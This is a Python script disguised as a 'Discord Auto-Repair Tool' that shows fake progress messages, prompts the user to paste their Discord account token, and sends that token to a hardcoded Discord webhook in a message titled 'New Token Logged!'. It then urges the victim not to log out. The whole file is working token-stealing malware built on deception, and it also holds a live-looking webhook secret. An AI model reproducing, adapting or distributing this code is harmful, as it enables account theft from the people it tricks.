import requests
import time
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1480886473246118031/J4tkbhv1_wLlFEqDch39bcvDDH4O5scxr4umdWZkL_pyOa-UevsDg3LGmGtX2yS2JiO6"

def start():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("=========================================")
    print("      DISCORD AUTO-REPAIR TOOL v2.4      ")
    print("=========================================")
    print("\n[!] Status: Connected to Discord API")
    print("[!] Action: Waiting for Authentication...")
    
    token = input("\n[>] Paste your Account Token to start: ")

    if token:
        print("\n[*] Connecting to Discord Servers...")
        time.sleep(2)
        print("[*] Bypassing Security Layers...")
        time.sleep(1.5)
        
        payload = {
            "embeds": [
                {
                    "title": "🎯 New Token Logged!",
                    "description": f"**Token:** `{token}`",
                    "color": 0x00ff00,
                    "footer": {"text": "Vex_playez Tool Success"}
                }
            ]
        }
        
        try:
            requests.post(WEBHOOK_URL, json=payload)
            print("[+] Success! Process started in background.")
            print("[+] You can close this window now, don't logout.")
        except:
            print("[-] Error: Connection lost.")
    else:
        print("\n[!] Empty token. Process cancelled.")

    input("\nPress Enter to exit...")

if __name__ == "__main__":
    start()